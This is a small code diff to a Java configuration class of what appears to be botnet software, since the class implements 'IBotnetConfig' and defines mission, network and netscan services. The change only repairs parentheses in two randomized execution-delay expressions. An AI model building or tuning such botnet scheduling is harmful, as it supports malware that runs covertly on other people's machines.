@@ -172,7 +172,7 @@ public final class ApplicationConfig implements IBotnetConfig {
 
     @ConfigValue(value = "service-mission.timeout",
                  comment = "Delay between repeated executing in milliseconds.\nDefault: between 6h and 10h",
-                 defaultValue = "(6*60*60+(Math.floor(Math.random()*14401))*1e3")
+                 defaultValue = "(6*60*60+(Math.floor(Math.random()*14401)))*1e3")
     private String sMissionTimeout;
 
     // služba - network
@@ -184,7 +184,7 @@ public final class ApplicationConfig implements IBotnetConfig {
 
     @ConfigValue(value = "service-network.timeout",
                  comment = "Delay between repeated executing in milliseconds.\nDefault: between 50min and 2h",
-                 defaultValue = "(50*60+(Math.floor(Math.random()*4201))*1e3")
+                 defaultValue = "(50*60+(Math.floor(Math.random()*4201)))*1e3")
     private String sNetworkTimeout;
 
     // služba - netscan
